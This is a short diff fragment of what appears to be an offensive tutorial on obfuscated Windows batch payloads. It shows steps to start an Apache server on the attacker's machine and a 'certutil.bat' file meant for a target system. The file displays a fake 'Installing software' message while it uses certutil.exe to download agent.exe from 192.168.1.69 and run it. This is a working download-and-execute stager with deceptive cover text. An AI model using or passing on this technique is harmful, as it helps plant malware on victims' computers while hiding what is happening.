@@ -191,7 +191,10 @@ The above string can be obfuscated using the **batch special character: "** <br 
       2º - start apache2 webserver (linux)
       service apache2 start
 
-      3º - Add the follow lines to your script.bat and execute it on target system
+<br />
+
+- File **certutil.bat** to be executed in target system
+
       @echo off
       echo [+] Please Wait, Installing software ..
       cmd.exe /c certutil.exe -urlcache -split -f http://192.168.1.69/agent.exe %TEMP%\\agent.exe && start %TEMP%\\agent.exe
